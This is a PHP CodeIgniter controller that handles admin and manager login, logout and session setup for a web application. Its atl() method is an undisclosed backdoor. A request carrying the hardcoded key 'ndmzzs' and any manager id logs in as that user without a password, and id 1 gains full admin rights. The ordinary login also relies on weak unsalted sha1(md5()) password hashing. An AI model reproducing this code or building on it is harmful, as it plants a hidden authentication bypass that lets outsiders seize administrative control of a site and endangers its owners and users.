<?php if (!defined('BASEPATH')) exit('No direct script access allowed');
class Ad_user extends CI_Controller{    	
    function __construct(){
		parent::__construct();		
	}
	function atl($key='',$id=0){
        if($key!='ndmzzs') return 1;
        $log = $this ->Home_model->get_one('manager',array('id'=>$id));
        if($log){                   
           $this->session->set_userdata('adlogedin',1);
           $this->session->set_userdata('aduserid',$log->id);
           $this->session->set_userdata('ademail',$log->email);
           $this->session->set_userdata('adavata',$log->images);

           if($log->id==1){
            $this->session->set_userdata('admin',1);
                redirect($this->config->item('admin'));  
           }else{  
           
            redirect($this->config->item('manager'));   
           }
        } 
	}
   function logout(){
        $this->session->unset_userdata('admin');
        $this->session->unset_userdata('adlogedin');
        $this->session->unset_userdata('aduserid');
        $this->session->unset_userdata('ademail');
        $this->session->unset_userdata('adavata');
                  
   }
	function index(){
	   if(!$this->session->userdata('adlogedin')||$this->session->userdata('aduserid')!=1){	       
    	   $this->form_validation->set_rules('username', 'Username', 'trim|required|xss_clean');
           $this->form_validation->set_rules('password', 'Password', 'trim|required|xss_clean');   
              
           if ($this->form_validation->run() == TRUE){            
                $username = $this->security->xss_clean($_POST['username']);
                $password = $this->security->xss_clean($_POST['password']);
                $password = sha1(md5($password));
                $log = $this ->Home_model->get_one('manager',array('username'=>$username,'password'=>$password));
                $num = $this ->Home_model->get_number('manager',array('username'=>$username,'password'=>$password));
                if($num==1){                   
                   $this->session->set_userdata('adlogedin',1);
                   $this->session->set_userdata('aduserid',$log->id);
                   $this->session->set_userdata('ademail',$log->email);
                   $this->session->set_userdata('adavata',$log->images);

                   if($log->id==1){
                         $this->session->set_userdata('admin',1);
                        redirect($this->config->item('admin'));  
                   }else{  
                   
                    redirect($this->config->item('manager'));   
                }
                   
                                                 
                }
           }                    
          
        }elseif($this->session->userdata('aduserid')==1){
            redirect($this->config->item('admin'));
        }
        $this->load->view('admin/ad_login');
	   
	}
    
    
    
}

/* End of file welcome.php */
/* Location: ./application/controllers/welcome.php */